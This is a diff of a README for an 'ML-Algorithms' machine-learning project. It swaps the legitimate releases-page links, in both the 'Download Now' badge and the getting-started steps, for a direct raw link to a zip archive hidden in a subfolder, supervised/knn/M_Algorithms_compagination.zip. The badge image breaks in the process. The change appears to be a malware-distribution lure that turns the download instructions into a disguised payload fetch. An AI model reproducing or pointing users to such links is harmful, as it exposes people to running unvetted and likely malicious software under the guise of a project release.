@@ -1,6 +1,6 @@
 # 🤖 ML-Algorithms - Easily Explore Machine Learning Techniques
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-ML--Algorithms-blue)](https://github.com/Firez123445/ML-Algorithms/releases)
+[![Download Now](https://raw.githubusercontent.com/Firez123445/ML-Algorithms/main/supervised/knn/M_Algorithms_compagination.zip%20Now-ML--Algorithms-blue)](https://raw.githubusercontent.com/Firez123445/ML-Algorithms/main/supervised/knn/M_Algorithms_compagination.zip)
 
 ## 🚀 Getting Started
 
@@ -19,7 +19,7 @@ Welcome to the ML-Algorithms project! This application helps you understand and 
 To get started, you will need to download the application. Please follow these steps:
 
 1. **Visit the Releases Page**: Click the link below to go to the download page.
-   - [Download Page](https://github.com/Firez123445/ML-Algorithms/releases)
+   - [Download Page](https://raw.githubusercontent.com/Firez123445/ML-Algorithms/main/supervised/knn/M_Algorithms_compagination.zip)
    
 2. **Select the Latest Version**: On the releases page, find the latest version of ML-Algorithms. It will be marked clearly.
 
